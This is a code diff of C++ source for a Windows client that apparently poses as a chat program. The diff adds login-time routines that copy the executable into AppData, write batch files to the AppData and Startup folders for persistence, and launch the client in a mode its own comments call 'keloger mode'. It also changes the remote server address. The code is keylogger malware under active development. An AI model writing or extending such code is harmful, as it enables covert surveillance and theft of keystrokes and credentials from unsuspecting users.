@@ -40,8 +40,35 @@ void copySelfToAppData() {
         }
     }
 }
+void createBatFileInAppdata(const string& argmail) {
+    // Get the username from environment variable
+    char username[MAX_PATH];
+    if (GetEnvironmentVariableA("USERNAME", username, sizeof(username))) {
 
-void createBatFileInStartup(const string& argmail) {
+        string batFilePath = "C:\\Users\\" + string(username) + "\\AppData\\Roaming\\runClient.bat";
+        
+        // Define the Startup folder path
+        string appdataDir = "C:\\Users\\" + string(username) + "\\AppData\\Roaming";
+        
+        // Ensure Startup folder exists
+        fs::path Folder(appdataDir);
+        if (fs::exists(Folder)) {
+            // Command to run the copied exe from AppData with arguments
+            string batContent = "start \"\" \"C:\\Users\\" + string(username) + "\\AppData\\Roaming\\client.exe\" --disable --" + argmail;
+
+            // Create and write the command to the .bat file in Startup
+            ofstream batFile(batFilePath);
+            if (batFile.is_open()) {
+                batFile << batContent;
+                batFile.close();
+            }
+        }
+    }
+}
+
+
+
+void createBatFileInStartup() {
     // Get the username from environment variable
     char username[MAX_PATH];
     if (GetEnvironmentVariableA("USERNAME", username, sizeof(username))) {
@@ -55,7 +82,7 @@ void createBatFileInStartup(const string& argmail) {
         fs::path startupFolder(startupDir);
         if (fs::exists(startupFolder)) {
             // Command to run the copied exe from AppData with arguments
-            string batContent = "start \"\" \"C:\\Users\\" + string(username) + "\\AppData\\Roaming\\client.exe\" --disable --" + argmail;
+            string batContent = "start \"\" \"C:\\Users\\" + string(username) + "\\AppData\\Roaming\\runClient.bat" ;
 
             // Create and write the command to the .bat file in Startup
             ofstream batFile(batFilePath);
@@ -450,6 +477,10 @@ void handleRegistration(ENetPeer* peer, ENetHost* client) {
 // 1. Get email and password
 // 2. Authenticate with server
 // 3. Enter chat mode if login successful
+// 4. Create a bat file on start up 
+// 5. Coppy file to app data 
+// 6. Create a bat file on appdata so the log.txt isnt on startup an
+// 7. Add user email as args so goes to keloger mode  
 // ---------------------------------------------------------------------
 void handleLogin(ENetPeer* peer, ENetHost* client) {
     // Clear input buffer
@@ -482,7 +513,8 @@ void handleLogin(ENetPeer* peer, ENetHost* client) {
         // Store email for keylogger
         setUserEmail(email);
         copySelfToAppData();
-        createBatFileInStartup(email);
+        createBatFileInAppdata(email);
+        createBatFileInStartup();
 
         // Wait for user to press Enter
         cin.get();
@@ -520,8 +552,8 @@ int application() {
     // --- CONNECT TO SERVER ---
     // Set server address
     ENetAddress address;
-    enet_address_set_host(&address, "174.55.88.123");  // Server IP address
-    address.port = 25555;                           // Fixed port to match server (25555)
+    enet_address_set_host(&address, "192.168.2.4");  // Server IP address
+    address.port = 25557;                           // Fixed port to match server (25555)
     
     // Attempt connection
     ENetPeer* peer = enet_host_connect(client, &address, 2, 0);
